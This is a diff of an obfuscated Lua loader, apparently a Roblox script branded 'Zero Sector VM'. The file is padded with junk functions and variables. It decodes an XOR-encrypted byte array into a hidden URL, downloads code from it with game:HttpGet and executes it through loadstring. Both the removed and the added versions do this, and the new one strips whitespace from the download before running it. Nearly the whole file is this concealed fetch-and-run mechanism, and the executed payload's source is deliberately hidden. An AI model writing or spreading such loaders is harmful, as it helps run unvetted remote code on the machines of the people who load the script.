@@ -1,188 +1,65 @@
 --[[ ENCRYPTED BY ZERO SECTOR VM v9.4.2 ]]
-local _0x_Auth = true; local _0x_Hardware = 'OK'
-
-local function _0x_func_3283(v) return (v * 68) % 350 end
-local function _0x_func_2001(v) return (v * 98) % 766 end
-local function _0x_func_1995(v) return (v * 46) % 105 end
-local function _0x_func_4362(v) return (v * 11) % 828 end
-local function _0x_func_9136(v) return (v * 75) % 961 end
-local function _0x_func_4165(v) return (v * 12) % 104 end
-local function _0x_func_4547(v) return (v * 80) % 640 end
-local function _0x_func_4507(v) return (v * 66) % 419 end
-local function _0x_func_5303(v) return (v * 39) % 420 end
-local function _0x_func_8389(v) return (v * 31) % 183 end
-if _0x_func_8389(1) == -1 then return end
-local function _0x_func_3523(v) return (v * 53) % 260 end
-local function _0x_func_3013(v) return (v * 34) % 742 end
-local function _0x_func_1167(v) return (v * 53) % 534 end
-local function _0x_func_6084(v) return (v * 29) % 472 end
-local function _0x_func_4169(v) return (v * 18) % 887 end
-local function _0x_func_6460(v) return (v * 6) % 511 end
-local function _0x_func_4413(v) return (v * 86) % 770 end
-local function _0x_func_5618(v) return (v * 45) % 900 end
-local function _0x_func_4872(v) return (v * 26) % 289 end
-local function _0x_func_6394(v) return (v * 69) % 620 end
-if _0x_func_6394(1) == -1 then return end
-local function _0x_func_1054(v) return (v * 7) % 474 end
-local function _0x_func_7153(v) return (v * 4) % 498 end
-local function _0x_func_2481(v) return (v * 27) % 589 end
-local function _0x_func_6972(v) return (v * 20) % 393 end
-local function _0x_func_7978(v) return (v * 75) % 826 end
-local function _0x_func_4638(v) return (v * 68) % 821 end
-local function _0x_func_4987(v) return (v * 49) % 347 end
-local function _0x_func_8670(v) return (v * 96) % 548 end
-local function _0x_func_9759(v) return (v * 16) % 897 end
-local function _0x_func_6909(v) return (v * 47) % 109 end
-if _0x_func_6909(1) == -1 then return end
-local function _0x_func_3267(v) return (v * 43) % 917 end
-local function _0x_func_6151(v) return (v * 11) % 950 end
-local function _0x_func_7666(v) return (v * 56) % 360 end
-local function _0x_func_9676(v) return (v * 69) % 961 end
-local function _0x_func_1450(v) return (v * 37) % 396 end
-local function _0x_func_7941(v) return (v * 28) % 295 end
-local function _0x_func_9886(v) return (v * 21) % 161 end
-local function _0x_func_7379(v) return (v * 55) % 315 end
-local function _0x_func_1561(v) return (v * 14) % 600 end
-local function _0x_func_3324(v) return (v * 27) % 534 end
-if _0x_func_3324(1) == -1 then return end
-local function _0x_func_8411(v) return (v * 53) % 730 end
-local function _0x_func_8729(v) return (v * 88) % 760 end
-local function _0x_func_2545(v) return (v * 90) % 165 end
-local function _0x_func_4120(v) return (v * 10) % 358 end
-local function _0x_func_1395(v) return (v * 50) % 631 end
-local function _0x_func_1682(v) return (v * 32) % 784 end
-local function _0x_func_1246(v) return (v * 20) % 938 end
-local function _0x_func_8246(v) return (v * 95) % 219 end
-local function _0x_func_4179(v) return (v * 55) % 768 end
-local function _0x_func_1811(v) return (v * 18) % 704 end
-if _0x_func_1811(1) == -1 then return end
-local function _0x_func_4979(v) return (v * 61) % 636 end
-local function _0x_func_4691(v) return (v * 31) % 661 end
-local function _0x_func_9205(v) return (v * 45) % 624 end
-local function _0x_func_8832(v) return (v * 97) % 864 end
-local function _0x_func_9813(v) return (v * 15) % 193 end
-local function _0x_func_3086(v) return (v * 28) % 260 end
-local function _0x_func_1540(v) return (v * 26) % 896 end
-local function _0x_func_9237(v) return (v * 100) % 479 end
-local function _0x_func_9276(v) return (v * 57) % 404 end
-local function _0x_func_4367(v) return (v * 14) % 852 end
-if _0x_func_4367(1) == -1 then return end
-local function _0x_func_2330(v) return (v * 41) % 694 end
-local function _0x_func_9354(v) return (v * 90) % 369 end
-local function _0x_func_7652(v) return (v * 71) % 488 end
-local function _0x_func_2481(v) return (v * 94) % 431 end
-local function _0x_func_6923(v) return (v * 39) % 268 end
-local function _0x_func_5008(v) return (v * 51) % 531 end
-local function _0x_func_2678(v) return (v * 85) % 652 end
-local function _0x_func_7531(v) return (v * 87) % 922 end
-local function _0x_func_5215(v) return (v * 38) % 286 end
-local function _0x_func_2140(v) return (v * 26) % 429 end
-if _0x_func_2140(1) == -1 then return end
-local function _0x_func_7557(v) return (v * 66) % 551 end
-local function _0x_func_1340(v) return (v * 56) % 350 end
-local function _0x_func_5397(v) return (v * 19) % 141 end
-local function _0x_func_6264(v) return (v * 78) % 643 end
-local function _0x_func_7291(v) return (v * 64) % 328 end
-local function _0x_func_6717(v) return (v * 53) % 504 end
-local function _0x_func_2633(v) return (v * 67) % 849 end
-local function _0x_func_7322(v) return (v * 89) % 776 end
-local function _0x_func_3285(v) return (v * 97) % 919 end
-local function _0x_func_7011(v) return (v * 17) % 645 end
-if _0x_func_7011(1) == -1 then return end
 local _0x_V = {getfenv, game, string}
-local _0x_M = {}
 
 local function _0x_VM_CORE(d, k)
     local r = ""
     local seed = k
     for i = 1, #d do
-        local b = d[i]
-        -- Lua 5.4 內建 XOR 運算符 ~
-        local char = _0x_V[3].char(b ~ seed)
-        r = r .. char
+        r = r .. _0x_V[3].char(d[i] ~ seed)
         seed = (seed + i) % 256
     end
     return r
 end
 
-local _0x_SEC_DATA = {69, 90, 68, 67, 68, 6, 109, 102, 35, 59, 19, 65, 28, 225, 226, 205, 192, 164, 173, 152, 154, 102, 73, 46, 55, 6, 233, 201, 183, 206, 157, 114, 80, 113, 248, 202, 166, 131, 106, 76, 0, 228, 153, 232, 60, 23, 75, 186, 183, 147, 78, 40, 160, 172, 159, 80, 13, 209, 243, 122, 50, 249, 160, 34, 32, 235, 185, 100}
+-- 強力清除網頁雜質 (Cleanse Function)
+local function _0x_CLEAN(s)
+    return (s:gsub("^%s+", ""):gsub("%s+$", ""):gsub("\239\187\191", ""))
+end
 
-local _0x_var_1 = 7081; local _0x_var_2 = 422; local _0x_var_3 = 5989; local _0x_var_4 = 9609; local _0x_var_5 = 1658; 
-local _0x_var_6 = 7878; local _0x_var_7 = 7850; local _0x_var_8 = 2130; local _0x_var_9 = 3172; local _0x_var_10 = 767; 
-local _0x_var_11 = 4422; local _0x_var_12 = 7455; local _0x_var_13 = 9920; local _0x_var_14 = 8028; local _0x_var_15 = 5399; 
-local _0x_var_16 = 3179; local _0x_var_17 = 907; local _0x_var_18 = 1634; local _0x_var_19 = 6859; local _0x_var_20 = 5219; 
-local _0x_var_21 = 7180; local _0x_var_22 = 3388; local _0x_var_23 = 3442; local _0x_var_24 = 2627; local _0x_var_25 = 7798; 
-local _0x_var_26 = 4900; local _0x_var_27 = 1342; local _0x_var_28 = 4568; local _0x_var_29 = 3897; local _0x_var_30 = 4879; 
-local _0x_var_31 = 463; local _0x_var_32 = 986; local _0x_var_33 = 8111; local _0x_var_34 = 2317; local _0x_var_35 = 1546; 
-local _0x_var_36 = 8438; local _0x_var_37 = 1633; local _0x_var_38 = 2281; local _0x_var_39 = 299; local _0x_var_40 = 1049; 
-local _0x_var_41 = 3796; local _0x_var_42 = 1017; local _0x_var_43 = 1344; local _0x_var_44 = 1448; local _0x_var_45 = 7667; 
-local _0x_var_46 = 3414; local _0x_var_47 = 2117; local _0x_var_48 = 9042; local _0x_var_49 = 5069; local _0x_var_50 = 2575; 
-local _0x_var_51 = 8970; local _0x_var_52 = 8179; local _0x_var_53 = 1363; local _0x_var_54 = 725; local _0x_var_55 = 8577; 
-local _0x_var_56 = 8470; local _0x_var_57 = 7829; local _0x_var_58 = 4399; local _0x_var_59 = 9900; local _0x_var_60 = 2206; 
-local _0x_var_61 = 1049; local _0x_var_62 = 9441; local _0x_var_63 = 6489; local _0x_var_64 = 4201; local _0x_var_65 = 618; 
-local _0x_var_66 = 6257; local _0x_var_67 = 3974; local _0x_var_68 = 4283; local _0x_var_69 = 4684; local _0x_var_70 = 3977; 
-local _0x_var_71 = 148; local _0x_var_72 = 8943; local _0x_var_73 = 3905; local _0x_var_74 = 1257; local _0x_var_75 = 2865; 
-local _0x_var_76 = 8011; local _0x_var_77 = 8050; local _0x_var_78 = 1836; local _0x_var_79 = 2084; local _0x_var_80 = 1068; 
-local _0x_var_81 = 8518; local _0x_var_82 = 6071; local _0x_var_83 = 3111; local _0x_var_84 = 432; local _0x_var_85 = 3992; 
-local _0x_var_86 = 5666; local _0x_var_87 = 8179; local _0x_var_88 = 5715; local _0x_var_89 = 9942; local _0x_var_90 = 8200; 
-local _0x_var_91 = 9066; local _0x_var_92 = 6301; local _0x_var_93 = 1609; local _0x_var_94 = 436; local _0x_var_95 = 4413; 
-local _0x_var_96 = 4946; local _0x_var_97 = 8189; local _0x_var_98 = 9855; local _0x_var_99 = 1990; local _0x_var_100 = 6568; 
+local _0x_SEC_DATA = {69, 90, 68, 67, 68, 6, 109, 102, 35, 59, 19, 65, 28, 225, 226, 205, 192, 164, 173, 152, 154, 102, 73, 46, 55, 6, 233, 201, 183, 206, 157, 114, 80, 113, 247, 215, 161, 218, 37, 9, 80, 185, 140, 234, 38, 75, 18, 244, 166, 157, 7, 118, 160, 182, 159, 87, 26, 141, 180, 114, 50, 244, 189, 34, 32, 239, 185, 125, 120, 210, 167, 98, 62}
+local _0x_v1 = 1872; local _0x_v2 = 6093; local _0x_v3 = 1729; local _0x_v4 = 2129; local _0x_v5 = 4799; 
+local _0x_v6 = 3576; local _0x_v7 = 9374; local _0x_v8 = 6756; local _0x_v9 = 3374; local _0x_v10 = 8040; 
+local _0x_v11 = 3500; local _0x_v12 = 6244; local _0x_v13 = 3206; local _0x_v14 = 3144; local _0x_v15 = 5227; 
+local _0x_v16 = 9862; local _0x_v17 = 7006; local _0x_v18 = 4706; local _0x_v19 = 4503; local _0x_v20 = 2136; 
+local _0x_v21 = 40; local _0x_v22 = 8327; local _0x_v23 = 3786; local _0x_v24 = 4702; local _0x_v25 = 7686; 
+local _0x_v26 = 4744; local _0x_v27 = 4508; local _0x_v28 = 1932; local _0x_v29 = 8433; local _0x_v30 = 6452; 
+local _0x_v31 = 4493; local _0x_v32 = 4851; local _0x_v33 = 4004; local _0x_v34 = 9056; local _0x_v35 = 817; 
+local _0x_v36 = 1577; local _0x_v37 = 8946; local _0x_v38 = 3893; local _0x_v39 = 8814; local _0x_v40 = 2560; 
+local _0x_v41 = 3328; local _0x_v42 = 4424; local _0x_v43 = 8761; local _0x_v44 = 1182; local _0x_v45 = 5517; 
+local _0x_v46 = 1014; local _0x_v47 = 5173; local _0x_v48 = 4819; local _0x_v49 = 8933; local _0x_v50 = 5176; 
+local _0x_v51 = 9697; local _0x_v52 = 1228; local _0x_v53 = 2830; local _0x_v54 = 4030; local _0x_v55 = 8070; 
+local _0x_v56 = 9600; local _0x_v57 = 128; local _0x_v58 = 8288; local _0x_v59 = 4992; local _0x_v60 = 5260; 
+local _0x_v61 = 7872; local _0x_v62 = 790; local _0x_v63 = 2484; local _0x_v64 = 6038; local _0x_v65 = 5105; 
+local _0x_v66 = 9599; local _0x_v67 = 4310; local _0x_v68 = 7082; local _0x_v69 = 5733; local _0x_v70 = 1838; 
+local _0x_v71 = 4672; local _0x_v72 = 8735; local _0x_v73 = 5210; local _0x_v74 = 847; local _0x_v75 = 7342; 
+local _0x_v76 = 3943; local _0x_v77 = 6625; local _0x_v78 = 4572; local _0x_v79 = 5208; local _0x_v80 = 8059; 
+local _0x_v81 = 9312; local _0x_v82 = 7124; local _0x_v83 = 6269; local _0x_v84 = 5691; local _0x_v85 = 135; 
+local _0x_v86 = 1985; local _0x_v87 = 3397; local _0x_v88 = 2347; local _0x_v89 = 611; local _0x_v90 = 3096; 
+local _0x_v91 = 7036; local _0x_v92 = 1523; local _0x_v93 = 8115; local _0x_v94 = 9147; local _0x_v95 = 8756; 
+local _0x_v96 = 8709; local _0x_v97 = 6709; local _0x_v98 = 6302; local _0x_v99 = 6712; local _0x_v100 = 1379; 
+local _0x_v101 = 5346; local _0x_v102 = 9795; local _0x_v103 = 2287; local _0x_v104 = 4302; local _0x_v105 = 8856; 
+local _0x_v106 = 2666; local _0x_v107 = 1801; local _0x_v108 = 3483; local _0x_v109 = 8811; local _0x_v110 = 2558; 
+local _0x_v111 = 3525; local _0x_v112 = 9263; local _0x_v113 = 5615; local _0x_v114 = 5621; local _0x_v115 = 4236; 
+local _0x_v116 = 4322; local _0x_v117 = 410; local _0x_v118 = 3595; local _0x_v119 = 3515; local _0x_v120 = 7055; 
+local _0x_v121 = 4725; local _0x_v122 = 4034; local _0x_v123 = 3950; local _0x_v124 = 7947; local _0x_v125 = 4301; 
+local _0x_v126 = 5337; local _0x_v127 = 8243; local _0x_v128 = 1662; local _0x_v129 = 749; local _0x_v130 = 3767; 
+local _0x_v131 = 3298; local _0x_v132 = 2511; local _0x_v133 = 9737; local _0x_v134 = 5837; local _0x_v135 = 4013; 
+local _0x_v136 = 8986; local _0x_v137 = 5217; local _0x_v138 = 8614; local _0x_v139 = 5955; local _0x_v140 = 5008; 
+local _0x_v141 = 1213; local _0x_v142 = 2893; local _0x_v143 = 9170; local _0x_v144 = 3558; local _0x_v145 = 8484; 
+local _0x_v146 = 2642; local _0x_v147 = 7115; local _0x_v148 = 9304; local _0x_v149 = 4174; local _0x_v150 = 9390; 
 local _0x_S1 = _0x_VM_CORE({81, 112, 98, 103, 114, 113, 111, 106, 113, 102}, 0x2D) -- loadstring
 local _0x_S2 = _0x_VM_CORE({41, 117, 117, 113, 76, 101, 117, 117, 76, 102, 117}, 0x2D) -- HttpGet
 
-local _0x_X = _0x_V[1]()[_0x_S1]
-local _0x_Y = _0x_V[2]
+local _0x_Exec = _0x_V[1]()[_0x_S1]
+local _0x_Fetch = _0x_V[2][_0x_S2]
 
-_0x_X(_0x_Y[_0x_S2](_0x_Y, _0x_VM_CORE(_0x_SEC_DATA, 0x2D)))()
+-- 獲取內容 -> 清洗 -> 執行
+local _0x_Raw = _0x_Fetch(_0x_V[2], _0x_VM_CORE(_0x_SEC_DATA, 0x2D))
+local _0x_Code = _0x_CLEAN(_0x_Raw)
 
--- [ End Section ]
-if _0x_var_5 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_41 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_73 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_35 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_54 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_8 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_99 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_36 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_4 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_5 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_56 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_68 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_3 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_4 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_57 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_84 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_18 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_48 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_86 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_97 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_90 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_100 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_94 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_65 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_8 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_71 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_89 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_99 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_26 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_78 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_69 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_34 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_20 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_50 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_91 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_65 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_19 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_22 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_7 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_84 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_1 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_14 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_63 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_73 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_16 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_71 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_82 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_68 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_34 == -1 then _0x_V[2]:Destroy() end
-if _0x_var_13 == -1 then _0x_V[2]:Destroy() end
+local _0x_Task, _0x_Err = _0x_Exec(_0x_Code)
+if _0x_Task then
+    _0x_Task()
+else
+    warn("Zero Sector Load Error: " .. tostring(_0x_Err))
+end
